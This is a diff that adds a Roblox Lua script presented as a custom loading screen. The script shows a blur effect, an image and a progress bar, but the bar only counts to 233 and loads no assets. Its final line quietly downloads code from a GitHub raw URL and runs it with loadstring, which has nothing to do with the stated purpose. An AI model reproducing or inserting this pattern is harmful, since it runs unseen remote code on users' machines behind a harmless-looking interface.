@@ -1,0 +1,72 @@
+-- Custom Loading Screen by HappyKiwi
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+
+local player = Players.LocalPlayer
+local gui = Instance.new("ScreenGui", player.PlayerGui)
+gui.IgnoreGuiInset = true
+
+local blur = Instance.new("BlurEffect", game.Lighting)
+blur.Size = 0
+TweenService:Create(blur, TweenInfo.new(1), {Size = 24}):Play()
+
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(1, 0, 1, 0)
+frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+frame.BackgroundTransparency = 1
+TweenService:Create(frame, TweenInfo.new(1), {BackgroundTransparency = 0.5}):Play()
+
+local football = Instance.new("ImageLabel", frame)
+football.AnchorPoint = Vector2.new(0.5, 0.5)
+football.Position = UDim2.new(0.5, 0, 0.5, -50)
+football.Size = UDim2.new(0, 150, 0, 150)
+football.Image = "rbxassetid://131581922632049"
+football.BackgroundTransparency = 1
+football.ImageTransparency = 1
+TweenService:Create(football, TweenInfo.new(1), {ImageTransparency = 0}):Play()
+
+local loadingBarFrame = Instance.new("Frame", frame)
+loadingBarFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+loadingBarFrame.Position = UDim2.new(0.5, 0, 0.7, 0)
+loadingBarFrame.Size = UDim2.new(0.6, 0, 0.02, 0)
+loadingBarFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+loadingBarFrame.BackgroundTransparency = 0.8
+
+local loadingBar = Instance.new("Frame", loadingBarFrame)
+loadingBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+loadingBar.Size = UDim2.new(0, 0, 1, 0)
+
+local loadingText = Instance.new("TextLabel", frame)
+loadingText.AnchorPoint = Vector2.new(0.5, 0)
+loadingText.Position = UDim2.new(0.5, 0, 0.75, 10)
+loadingText.Size = UDim2.new(0.8, 0, 0.1, 0)
+loadingText.Font = Enum.Font.SourceSans
+loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+loadingText.TextSize = 20
+loadingText.TextTransparency = 1
+loadingText.Text = "Loading Assets: 0/233"
+TweenService:Create(loadingText, TweenInfo.new(1), {TextTransparency = 0}):Play()
+
+local assetsLoaded = 0
+local totalAssets = 233
+for i = 1, totalAssets do
+assetsLoaded = i
+loadingBar:TweenSize(UDim2.new(assetsLoaded / totalAssets, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Linear, 0.02, true)
+loadingText.Text = string.format("Loading Assets: %d/%d", assetsLoaded, totalAssets)
+RunService.Heartbeat:Wait()
+end
+
+TweenService:Create(football, TweenInfo.new(1), {ImageTransparency = 1}):Play()
+TweenService:Create(loadingText, TweenInfo.new(1), {TextTransparency = 1}):Play()
+TweenService:Create(frame, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
+TweenService:Create(blur, TweenInfo.new(1), {Size = 0}):Play()
+
+task.wait(1)
+
+blur:Destroy()
+gui:Destroy()
+
+print("credit: saint!")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Yoogp/rash.lolv2/refs/heads/main/refs"))()
